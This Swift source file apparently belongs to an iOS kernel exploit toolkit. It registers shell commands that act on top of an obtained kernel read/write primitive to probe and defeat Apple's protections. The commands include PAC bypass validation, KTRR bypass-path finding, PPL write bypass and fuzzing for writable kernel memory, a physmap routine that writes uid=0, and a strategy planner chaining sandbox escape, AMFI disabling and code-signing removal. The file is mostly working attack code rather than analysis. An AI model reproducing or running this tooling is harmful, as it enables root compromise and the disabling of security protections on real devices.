//
//  OmegaExtendedG.swift
//  lara
//
//  PAC / KTRR / SMR / PPL Analysis Shell — wraps tp_* C tools
//  Registration entry: registerPPLShellCommands()
//

import Foundation
import Darwin

// MARK: - Helpers

private func _gtr(_ r: tool_result_t) -> String {
    var m = r.msg
    return withUnsafeBytes(of: &m) {
        String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
    }
}

private func _gresult(_ r: tool_result_t) -> CommandResult {
    r.code == 0 ? .ok(_gtr(r)) : .fail(_gtr(r))
}

private func _ghex(_ s: String) -> UInt64? {
    let t = s.trimmingCharacters(in: .whitespaces)
    let x = (t.hasPrefix("0x") || t.hasPrefix("0X")) ? String(t.dropFirst(2)) : t
    return UInt64(x, radix: 16)
}

// MARK: - Registration

func registerPPLShellCommands() {
    _regPAC()
    _regKTRR()
    _regSMR()
    _regPPL()
    _regHelpPPL()
}

// MARK: §1 — PAC

private func _regPAC() {

    OmegaCore.register("pac-reader") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-reader: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let va = _ghex(parts[0]) else {
            return .fail("pac-reader: usage — pac-reader <kernel_va_hex>")
        }
        var info = pac_info_t()
        let r = tp_pac_reader(va, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let desc = withUnsafeBytes(of: info.desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "pac-reader @ 0x%016llx:\n" +
            "  raw_ptr    : 0x%016llx\n" +
            "  stripped   : 0x%016llx\n" +
            "  pac_tag    : 0x%016llx\n" +
            "  is_data    : %@\n" +
            "  is_signed  : %@\n" +
            "  is_null    : %@\n" +
            "  va_bits    : %u\n" +
            "  info       : %@",
            va, info.raw_ptr, info.stripped_ptr, info.pac_tag,
            info.is_data_ptr ? "yes" : "no",
            !info.is_canonical ? "yes" : "no",
            info.is_null ? "yes" : "no",
            info.va_bits, desc
        ))
    }

    OmegaCore.register("pac-signature-extractor") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-signature-extractor: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("pac-signature-extractor: usage — pac-signature-extractor <raw_ptr_hex>")
        }
        var info = pac_info_t()
        let r = tp_pac_signature_extractor(ptr, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        return .ok(String(format:
            "pac-signature-extractor:\n" +
            "  raw_ptr  : 0x%016llx\n" +
            "  pac_tag  : 0x%016llx\n" +
            "  stripped : 0x%016llx\n" +
            "  is_data  : %@\n" +
            "  canonical: %@",
            info.raw_ptr, info.pac_tag, info.stripped_ptr,
            info.is_data_ptr ? "yes (PACDA)" : "no (PACIA)",
            info.is_canonical ? "yes (no PAC)" : "no (PAC-signed)"
        ))
    }

    OmegaCore.register("pac-key-scanner") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-key-scanner: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        let start = parts.count > 0 ? (_ghex(parts[0]) ?? ds_get_kernel_base() + 0x800_0000) : ds_get_kernel_base() + 0x800_0000
        let end   = parts.count > 1 ? (_ghex(parts[1]) ?? start + 0x100_0000) : start + 0x100_0000
        var addrs = [UInt64](repeating: 0, count: 64)
        var count: Int32 = 0
        let r = tp_pac_key_scanner(start, end, &addrs, &count, 64)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = [String(format: "pac-key-scanner: 0x%016llx–0x%016llx  found %d signed ptrs", start, end, count)]
        for i in 0..<min(Int(count), 16) {
            lines.append(String(format: "  [%02d] 0x%016llx", i, addrs[i]))
        }
        if count > 16 { lines.append("  … and \(count - 16) more") }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("pac-context-analyzer") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-context-analyzer: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("pac-context-analyzer: usage — pac-context-analyzer <raw_ptr_hex>")
        }
        var info = pac_info_t()
        let r = tp_pac_context_analyzer(ptr, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let desc = withUnsafeBytes(of: info.desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "pac-context-analyzer 0x%016llx:\n  type=%@  tag=0x%016llx\n  %@",
            ptr, info.is_data_ptr ? "PACDA" : "PACIA", info.pac_tag, desc))
    }

    OmegaCore.register("pac-entropy-checker") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-entropy-checker: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let start = _ghex(parts[0]) else {
            return .fail("pac-entropy-checker: usage — pac-entropy-checker <va> [count=64]")
        }
        let n = min(Int(parts.count > 1 ? parts[1] : "") ?? 64, 256)
        var ptrs = (0..<n).compactMap { i -> UInt64? in
            let a = start + UInt64(i) * 8
            return ds_isvalid(a) ? ds_kread64(a) : nil
        }
        var entropy: Double = 0
        let r = tp_pac_entropy_checker(&ptrs, Int32(ptrs.count), &entropy)
        return r.code == 0
            ? .ok(String(format: "pac-entropy-checker: %d samples  entropy=%.3f bits\n%@", ptrs.count, entropy, _gtr(r)))
            : .fail(_gtr(r))
    }

    OmegaCore.register("pac-algorithm-fingerprint") { _, mgr in
        guard mgr.dsready else { return .fail("pac-algorithm-fingerprint: exploit not ready") }
        return _gresult(tp_pac_algorithm_fingerprint())
    }

    OmegaCore.register("pac-strength-analyzer") { _, mgr in
        guard mgr.dsready else { return .fail("pac-strength-analyzer: exploit not ready") }
        var score: Int32 = 0
        let r = tp_pac_strength_analyzer(&score)
        return r.code == 0
            ? .ok(String(format: "pac-strength-analyzer: score=%d/100\n%@", score, _gtr(r)))
            : .fail(_gtr(r))
    }

    OmegaCore.register("pac-coverage-mapper") { _, mgr in
        guard mgr.dsready else { return .fail("pac-coverage-mapper: exploit not ready") }
        var buf = [CChar](repeating: 0, count: 4096)
        let r = tp_pac_coverage_mapper(&buf, 4096)
        if r.code != 0 { return .fail(_gtr(r)) }
        return .ok("pac-coverage-mapper:\n" + String(cString: buf))
    }

    OmegaCore.register("pac-weak-key-detector") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-weak-key-detector: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let start = _ghex(parts[0]) else {
            return .fail("pac-weak-key-detector: usage — pac-weak-key-detector <va> [count=64] [threshold=2]")
        }
        let n    = min(Int(parts.count > 1 ? parts[1] : "") ?? 64, 256)
        let thr  = Int32(parts.count > 2 ? parts[2] : "") ?? 2
        var tags = (0..<n).compactMap { i -> UInt64? in
            let a = start + UInt64(i) * 8
            return ds_isvalid(a) ? ds_kread64(a) : nil
        }
        let r = tp_pac_weak_key_detector(&tags, Int32(tags.count), thr)
        return _gresult(r)
    }

    OmegaCore.register("pac-null-pointer-checker") { rawArg, mgr in
        guard mgr.dsready else { return .fail("pac-null-pointer-checker: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let va = _ghex(parts[0]) else {
            return .fail("pac-null-pointer-checker: usage — pac-null-pointer-checker <va> [len=256]")
        }
        let len = Int(parts.count > 1 ? parts[1] : "") ?? 256
        let r = tp_pac_null_pointer_checker(va, len)
        return _gresult(r)
    }

    OmegaCore.register("pac-bypass-validator") { _, mgr in
        guard mgr.dsready else { return .fail("pac-bypass-validator: exploit not ready") }
        return _gresult(tp_pac_bypass_validator())
    }
}

// MARK: §2 — KTRR

private func _regKTRR() {

    OmegaCore.register("ktrr-region-mapper") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-region-mapper: exploit not ready") }
        guard ds_is_ready() else { return .fail("ktrr-region-mapper: kernel r/w unavailable — revive session or re-run exploit") }
        var regions = [kregion_info_t](repeating: kregion_info_t(), count: 32)
        var count: Int32 = 0
        let r = tp_ktrr_region_mapper(&regions, &count, 32)
        if r.code != 0 { return .fail(_gtr(r)) }
        // Bounds check BEFORE iterating — garbage count from failed kernel reads causes crash.
        // tp_ktrr_region_mapper can return a stale/corrupt count when kread returns 0.
        guard count >= 0 && count <= 32 else {
            return .fail("ktrr-region-mapper: invalid region count \(count) — kernel r/w degraded (count must be 0–32)")
        }
        if count == 0 { return .ok("ktrr-region-mapper: 0 regions found (kernel r/w may be limited)") }
        var lines = ["ktrr-region-mapper: \(count) region(s)"]
        lines.append("  REGION            START                END                  KTRR  PPL   EXEC")
        lines.append("  ─────────────── ─────────────────── ──────────────────── ───── ───── ────")
        for i in 0..<Int(count) {
            let reg = regions[i]
            // Pointer validation — skip regions with zero or non-kernel start addresses
            guard reg.region_start != 0 && ds_isvalid(reg.region_start) else { continue }
            let name = withUnsafeBytes(of: reg.region_name) {
                String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
            }
            lines.append(String(format: "  %-15s 0x%016llx  0x%016llx   %@     %@     %@",
                name, reg.region_start, reg.region_end,
                reg.is_ktrr ? "yes" : "no",
                reg.is_ppl_zone ? "yes" : "no",
                reg.is_executable ? "yes" : "no"
            ))
        }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("ktrr-boundary-finder") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-boundary-finder: exploit not ready") }
        var start: UInt64 = 0
        var end: UInt64 = 0
        let r = tp_ktrr_boundary_finder(&start, &end)
        if r.code != 0 { return .fail(_gtr(r)) }
        return .ok(String(format:
            "ktrr-boundary-finder:\n  start : 0x%016llx\n  end   : 0x%016llx\n  size  : 0x%llx bytes\n  %@",
            start, end, end > start ? end - start : 0, _gtr(r)
        ))
    }

    OmegaCore.register("ktrr-permission-checker") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ktrr-permission-checker: exploit not ready") }
        guard let va = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("ktrr-permission-checker: usage — ktrr-permission-checker <addr_hex>")
        }
        var info = kregion_info_t()
        let r = tp_ktrr_permission_checker(va, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let name = withUnsafeBytes(of: info.region_name) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "ktrr-permission-checker @ 0x%016llx:\n" +
            "  region     : %@\n" +
            "  ap_bits    : 0x%x\n" +
            "  is_ktrr    : %@\n" +
            "  is_ppl     : %@\n" +
            "  is_exec    : %@\n" +
            "  is_ro      : %@",
            va, name, info.ap_bits,
            info.is_ktrr ? "YES ✔" : "no",
            info.is_ppl_zone ? "YES" : "no",
            info.is_executable ? "yes" : "no",
            info.is_readonly ? "yes (no write)" : "no (writable)"
        ))
    }

    OmegaCore.register("ktrr-enforcement-detector") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-enforcement-detector: exploit not ready") }
        var active: Bool = false
        let r = tp_ktrr_enforcement_detector(&active)
        return r.code == 0
            ? .ok(String(format: "ktrr-enforcement-detector:\n  active: %@\n  %@", active ? "YES (KTRR enforced ✔)" : "NO (KTRR bypassed)", _gtr(r)))
            : .fail(_gtr(r))
    }

    OmegaCore.register("ktrr-bypass-paths-finder") { _, mgr in
        guard mgr.dsready else { return .fail("ktrr-bypass-paths-finder: exploit not ready") }
        var vas = [UInt64](repeating: 0, count: 32)
        var count: Int32 = 0
        let r = tp_ktrr_bypass_paths_finder(&vas, &count, 32)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = ["ktrr-bypass-paths-finder: \(count) RW window(s) found"]
        for i in 0..<Int(count) {
            lines.append(String(format: "  [%02d] 0x%016llx", i, vas[i]))
        }
        if count == 0 { lines.append("  (no writable paths found in scan range)") }
        return .ok(lines.joined(separator: "\n"))
    }
}

// MARK: §3 — SMR

private func _regSMR() {

    OmegaCore.register("smr-region-scanner") { _, mgr in
        guard mgr.dsready else { return .fail("smr-region-scanner: exploit not ready") }
        var infos = [smr_info_t](repeating: smr_info_t(), count: 64)
        var count: Int32 = 0
        let r = tp_smr_region_scanner(&infos, &count, 64)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = ["smr-region-scanner: \(count) SMR-tagged pointer(s)"]
        lines.append("  IDX  SMR_PTR              REAL_PTR             EPOCH  VALID")
        lines.append("  ───  ─────────────────── ─────────────────── ──────  ─────")
        for i in 0..<min(Int(count), 24) {
            let info = infos[i]
            lines.append(String(format: "  %-3d  0x%016llx  0x%016llx  0x%04x  %@",
                i, info.smr_ptr, info.real_ptr, info.epoch_tag, info.is_valid ? "yes" : "no"
            ))
        }
        if count > 24 { lines.append("  … and \(count - 24) more") }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("smr-metadata-reader") { rawArg, mgr in
        guard mgr.dsready else { return .fail("smr-metadata-reader: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("smr-metadata-reader: usage — smr-metadata-reader <smr_ptr_hex>")
        }
        var info = smr_info_t()
        let r = tp_smr_metadata_reader(ptr, &info)
        if r.code != 0 { return .fail(_gtr(r)) }
        let desc = withUnsafeBytes(of: info.desc) {
            String(cString: $0.baseAddress!.assumingMemoryBound(to: CChar.self))
        }
        return .ok(String(format:
            "smr-metadata-reader 0x%016llx:\n" +
            "  smr_ptr    : 0x%016llx\n" +
            "  real_ptr   : 0x%016llx\n" +
            "  epoch_tag  : 0x%04x\n" +
            "  is_valid   : %@\n" +
            "  desc       : %@",
            ptr, info.smr_ptr, info.real_ptr, info.epoch_tag,
            info.is_valid ? "yes" : "no", desc
        ))
    }

    OmegaCore.register("smr-protection-level-analyzer") { _, mgr in
        guard mgr.dsready else { return .fail("smr-protection-level-analyzer: exploit not ready") }
        return _gresult(tp_smr_protection_level_analyzer())
    }

    OmegaCore.register("smr-isolation-tester") { rawArg, mgr in
        guard mgr.dsready else { return .fail("smr-isolation-tester: exploit not ready") }
        guard let ptr = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("smr-isolation-tester: usage — smr-isolation-tester <smr_ptr_hex>")
        }
        return _gresult(tp_smr_isolation_tester(ptr))
    }
}

// MARK: §4 — PPL

private func _regPPL() {

    OmegaCore.register("ppl-status") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-status: exploit not ready") }
        let uid    = getuid()
        let pplBp  = ppl_is_bypassed()
        let pmOk   = pm_fingerprint_ok()
        let pmBase = pm_get_physmap_base()
        let ucredV = pm_get_ucred_va()
        let enforce = amfi_get_mac_proc_enforce()
        return .ok(String(format:
            "──────── ppl-status ────────\n" +
            "  uid              : %d  %@\n" +
            "  ppl_is_bypassed  : %@\n" +
            "  physmap_ok       : %@\n" +
            "  physmap_base     : 0x%016llx\n" +
            "  ucred_va         : 0x%016llx\n" +
            "  mac_proc_enforce : %u  %@\n" +
            "  vfs_ready        : %@\n" +
            "  sbx_ready        : %@\n" +
            "────────────────────────────",
            uid, uid == 0 ? "ROOT ✔" : "user",
            pplBp ? "YES ✔" : "no",
            pmOk  ? "YES ✔" : "no",
            pmBase, ucredV,
            enforce, enforce == 0 ? "disabled ✔" : "enforcing",
            mgr.vfsready ? "yes ✔" : "no",
            mgr.sbxready ? "yes ✔" : "no"
        ))
    }

    OmegaCore.register("ppl-phase-report") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-phase-report: exploit not ready") }
        let p1 = pm_phase1_fingerprint()
        let p2 = pm_phase2_resolve_ucred()
        let p3 = pm_phase3_write_root()
        let uid = getuid()
        return .ok(String(format:
            "ppl-phase-report:\n" +
            "  Phase 1 (physmap fingerprint) : %d  %@\n" +
            "  Phase 2 (ucred via physmap)   : %d  %@\n" +
            "  Phase 3 (write uid=0)         : %d  %@\n" +
            "  Final uid                     : %d  %@",
            p1, p1 == 0 ? "✔ pmap located" : "✖ pmap not found",
            p2, p2 == 0 ? "✔ ucred resolved" : "✖ failed",
            p3, p3 == 0 ? "✔ uid=0 written" : "✖ failed",
            uid, uid == 0 ? "ROOT ✔" : "(not root)"
        ))
    }

    OmegaCore.register("ppl-write-bypass") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ppl-write-bypass: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard parts.count == 2, let va = _ghex(parts[0]) else {
            return .fail("ppl-write-bypass: usage — ppl-write-bypass <addr_hex> <u32_val_hex>")
        }
        let valStr = parts[1].hasPrefix("0x") ? String(parts[1].dropFirst(2)) : parts[1]
        guard let val = UInt32(valStr, radix: 16) else {
            return .fail("ppl-write-bypass: invalid value '\(parts[1])'")
        }
        return _gresult(tp_ppl_write_bypass(va, val))
    }

    OmegaCore.register("ppl-signature-forge") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-signature-forge: exploit not ready") }
        // Use pac-bypass-validator as the closest available function
        return _gresult(tp_pac_bypass_validator())
    }

    OmegaCore.register("ppl-protected-variable-read") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ppl-protected-variable-read: exploit not ready") }
        guard let va = _ghex(rawArg.trimmingCharacters(in: .whitespaces)) else {
            return .fail("ppl-protected-variable-read: usage — ppl-protected-variable-read <addr_hex>")
        }
        guard ds_isvalid(va) else {
            return .fail("ppl-protected-variable-read: invalid address 0x\(String(va, radix: 16))")
        }
        var isPPL: Bool = false
        let zr = tp_ppl_zone_checker(va, &isPPL)
        let v64 = ds_kread64(va)
        let v32 = ds_kread32(va)
        let smr = ds_kreadsmrptr(va)
        return .ok(String(format:
            "ppl-protected-variable-read @ 0x%016llx:\n" +
            "  is_ppl  : %@  %@\n" +
            "  read64  : 0x%016llx\n" +
            "  read32  : 0x%08x\n" +
            "  smr_read: 0x%016llx",
            va, isPPL ? "YES ✔" : "no",
            zr.code == 0 ? _gtr(zr) : "",
            v64, v32, smr
        ))
    }

    OmegaCore.register("ppl-bypass-strategy-planner") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-bypass-strategy-planner: exploit not ready") }
        let uid   = getuid()
        let pplBp = ppl_is_bypassed()
        let p1    = pm_fingerprint_ok()
        var lines = [
            "ppl-bypass-strategy-planner:",
            String(format: "  uid           : %d  %@", uid, uid == 0 ? "ROOT ✔" : "user"),
            "  ppl_bypassed  : \(pplBp ? "yes ✔" : "no")",
            "  physmap_ok    : \(p1 ? "yes ✔" : "no")",
            "",
            "  Recommended strategy:",
        ]
        if uid == 0 {
            lines.append("    ✔ Already root — run cs-remove-all-restrictions to solidify")
        } else if pplBp {
            lines.append("    1. ppl already bypassed → set-all-ids-zero")
            lines.append("    2. amfi-disable-globally")
            lines.append("    3. cs-remove-all-restrictions")
        } else if p1 {
            lines.append("    1. physmap P1 OK → run ppl-phase-report")
            lines.append("    2. Try: auto-ppl-breaker")
        } else {
            lines.append("    1. sandbox-complete-escape")
            lines.append("    2. amfi-disable-globally")
            lines.append("    3. set-all-ids-zero")
            lines.append("    4. cs-remove-all-restrictions")
        }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("ppl-fuzzer") { rawArg, mgr in
        guard mgr.dsready else { return .fail("ppl-fuzzer: exploit not ready") }
        let parts = rawArg.split(separator: " ").map { String($0) }
        guard !parts.isEmpty, let start = _ghex(parts[0]) else {
            return .fail("ppl-fuzzer: usage — ppl-fuzzer <start_addr> [probe_len=128]")
        }
        let len = Int(parts.count > 1 ? parts[1] : "") ?? 128
        var writable = [UInt64](repeating: 0, count: 32)
        var count: Int32 = 0
        let r = tp_ppl_fuzzer(start, len, &writable, &count, 32)
        if r.code != 0 { return .fail(_gtr(r)) }
        var lines = [String(format: "ppl-fuzzer @ 0x%016llx len=0x%x: %d writable addr(s)", start, len, count)]
        for i in 0..<Int(count) {
            lines.append(String(format: "  [%02d] 0x%016llx  WRITABLE ✔", i, writable[i]))
        }
        if count == 0 { lines.append("  All writes blocked — PPL fully enforced here") }
        return .ok(lines.joined(separator: "\n"))
    }

    OmegaCore.register("ppl-version-comparison") { _, mgr in
        guard mgr.dsready else { return .fail("ppl-version-comparison: exploit not ready") }
        return _gresult(tp_ppl_version_comparison())
    }

    OmegaCore.register("auto-ppl-breaker") { _, mgr in
        guard mgr.dsready else { return .fail("auto-ppl-breaker: exploit not ready") }
        return _gresult(tp_auto_ppl_breaker())
    }

    OmegaCore.register("comprehensive-ppl-tester") { _, mgr in
        guard mgr.dsready else { return .fail("comprehensive-ppl-tester: exploit not ready") }
        return _gresult(tp_comprehensive_ppl_tester())
    }
}

// MARK: §5 — Help

private func _regHelpPPL() {
    OmegaCore.register("help-ppl") { _, _ in
        .ok("""
help-ppl: PAC / KTRR / SMR / PPL Analysis (OmegaExtendedG)
─────────────────────────────────────────────────────────────────────────
  PAC — Pointer Authentication:
    pac-reader <va>                 Decode PAC-signed kernel pointer
    pac-signature-extractor <ptr>   Extract PAC tag from raw pointer
    pac-key-scanner [start] [end]   Scan kernel for PAC-signed ptrs
    pac-context-analyzer <ptr>      PACDA vs PACIA analysis
    pac-entropy-checker <va> [n]    Measure PAC signature entropy
    pac-algorithm-fingerprint       Identify PAC algorithm (QARMA)
    pac-strength-analyzer           Overall PAC protection score
    pac-coverage-mapper             PAC coverage of known structs
    pac-weak-key-detector <va> [n] [t]  Check for duplicate tags
    pac-null-pointer-checker <va>   Find null-PAC (PACIZA) ptrs
    pac-bypass-validator            Confirm bypass correctness

  KTRR — Kernel Text Region Read-only:
    ktrr-region-mapper              All KTRR-protected regions + PTE
    ktrr-boundary-finder            Exact KTRR start/end VA
    ktrr-permission-checker <addr>  AP bits + protection for addr
    ktrr-enforcement-detector       Is KTRR hardware-enforced?
    ktrr-bypass-paths-finder        RW windows via physmap

  SMR — Secure Memory Region:
    smr-region-scanner              Scan allproc for SMR ptrs
    smr-metadata-reader <ptr>       Decode SMR pointer + epoch
    smr-protection-level-analyzer   Epoch size + rotation policy
    smr-isolation-tester <ptr>      SMR boundary reachability

  PPL — Page Protection Layer:
    ppl-status                      Full PPL + privilege snapshot
    ppl-phase-report                OmegaPhysmap P1/P2/P3 results
    ppl-write-bypass <addr> <val>   physmap write attempt
    ppl-signature-forge             PAC forgery test
    ppl-protected-variable-read <a> Read + PPL zone check
    ppl-bypass-strategy-planner     Auto-recommend bypass path
    ppl-fuzzer <addr> [len]         Probe for writable windows
    ppl-version-comparison          PPL history across iOS versions
    auto-ppl-breaker                Run best bypass automatically
    comprehensive-ppl-tester        Full 7-check test battery
─────────────────────────────────────────────────────────────────────────
""")
    }
}
